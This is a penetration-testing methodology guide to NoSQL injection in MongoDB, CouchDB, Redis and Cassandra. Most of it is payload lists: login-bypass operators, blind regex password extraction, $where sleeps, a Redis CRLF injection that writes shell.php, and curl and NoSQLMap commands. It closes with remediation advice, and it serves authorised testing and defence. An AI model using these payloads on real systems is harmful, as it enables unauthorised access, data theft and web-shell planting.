# NoSQL Injection Testing

## Overview
NoSQL injection exploits vulnerabilities in applications using NoSQL databases (MongoDB, CouchDB, Redis, etc.) where user input is improperly handled in database queries. Unlike SQL injection, NoSQL injection targets document-based, key-value, or graph query syntaxes.

## Classification
- **CWE:** CWE-943 (Improper Neutralization of Special Elements in Data Query Logic)
- **OWASP:** A03:2021 - Injection
- **CVSS Base:** 7.5 - 9.8

## Detection Methodology

### 1. MongoDB Injection

#### Authentication Bypass
```json
// Original query: db.users.find({user: input_user, pass: input_pass})
// Inject:
{"user": {"$gt": ""}, "pass": {"$gt": ""}}
{"user": "admin", "pass": {"$ne": ""}}
{"user": "admin", "pass": {"$regex": ".*"}}
```

#### URL Parameter Injection
```
username[$ne]=invalid&password[$ne]=invalid
username=admin&password[$gt]=
username[$regex]=^admin&password[$regex]=^
```

#### Operator Injection
```json
// $where JavaScript execution
{"$where": "this.username == 'admin'"}
{"$where": "sleep(5000)"}  // Time-based

// $regex for data extraction
{"username": {"$regex": "^a"}}  // Enumerate char by char

// $gt/$lt for range queries
{"password": {"$gt": "a"}}
```

#### JavaScript Injection (Server-Side)
```javascript
// MongoDB $where clause
db.users.find({$where: "this.username == '" + input + "'"})
// Inject: ' || 1==1//
// Inject: '; sleep(5000); var a='
```

### 2. CouchDB Injection
```
// Mango query injection
{"selector": {"username": {"$eq": input}}}
// Inject in input: {"$gt": null}

// View injection via URL
/_all_docs?startkey="admin"&endkey="admin\uffff"
```

### 3. Redis Injection
```
// Command injection via CRLF
SET user "admin"\r\nCONFIG SET dir /var/www/\r\nCONFIG SET dbfilename shell.php\r\n

// Lua script injection
EVAL "return redis.call('get', KEYS[1])" 1 user
```

### 4. Cassandra Injection (CQL)
```sql
-- Similar to SQL injection but CQL syntax
SELECT * FROM users WHERE username = '' OR ''='' ALLOW FILTERING;
```

## Blind NoSQL Injection

### Boolean-Based (MongoDB)
```
// Extract password character by character
username=admin&password[$regex]=^a     → 200 (first char is 'a')
username=admin&password[$regex]=^ab    → 200 (second char is 'b')
username=admin&password[$regex]=^ac    → 401 (wrong)
```

### Time-Based (MongoDB)
```json
{"$where": "if(this.username=='admin'){sleep(5000)}else{sleep(0)}"}
```

## Tool Usage

### NoSQLMap
```bash
# Basic scan
nosqlmap -u "http://target.com/login" --data "username=admin&password=test"

# MongoDB enumeration
nosqlmap -u "http://target.com/api" --enum-dbs
```

### Manual Testing with curl
```bash
# MongoDB operator injection via JSON
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}'

# MongoDB regex extraction
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^a"}}'
```

## Data Extraction Techniques

### MongoDB Full Extraction Flow
1. Enumerate database names via `$where` or error messages
2. Enumerate collection names: `db.getCollectionNames()`
3. Extract field names via `$exists`: `{"field_name": {"$exists": true}}`
4. Extract values via `$regex` character-by-character brute force
5. Use `$gt` / `$lt` for binary search optimization

### Automation Script Logic
```
For each character position:
  For each possible character [a-zA-Z0-9...]:
    Send: {"field": {"$regex": "^known_chars+test_char"}}
    If response indicates true → append character, move to next position
    If all characters fail → extraction complete
```

## Remediation
1. **Input validation** — Reject `$` prefixed keys in user input
2. **Sanitize operators** — Strip MongoDB operators from input
3. **Use ODM safely** — Mongoose with strict schemas
4. **Disable server-side JS** — `--noscripting` flag in MongoDB
5. **Parameterized queries** where available
6. **Least privilege** database roles

## Evidence Collection
- Injected payload and full response
- Database type and version identified
- Collections/data accessed
- Authentication bypass proof
- Impact assessment
